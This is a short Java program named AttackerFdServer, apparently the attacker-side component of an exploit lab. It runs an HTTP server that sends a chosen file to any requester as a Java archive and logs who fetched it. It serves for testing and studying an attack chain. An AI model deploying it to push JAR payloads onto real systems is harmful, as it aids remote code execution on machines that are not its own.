import com.sun.net.httpserver.HttpServer;

import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Paths;

public class AttackerFdServer {
    public static void main(String[] args) throws Exception {
        int port = Integer.parseInt(System.getProperty("port", "8001"));
        String file = System.getProperty("file", "/www/x");
        HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", port), 0);
        server.createContext("/", ex -> {
            byte[] body = Files.readAllBytes(Paths.get(file));
            System.out.println("[attacker-fd] " + ex.getRequestMethod() + " " + ex.getRequestURI()
                    + " from " + ex.getRemoteAddress() + " -> serving " + file + " (" + body.length + " bytes)");
            ex.getResponseHeaders().set("Content-Type", "application/java-archive");
            ex.sendResponseHeaders(200, body.length);
            ex.getResponseBody().write(body);
            ex.close();
        });
        server.start();
        System.out.println("[attacker-fd] serving on :" + port + " file=" + file);
    }
}
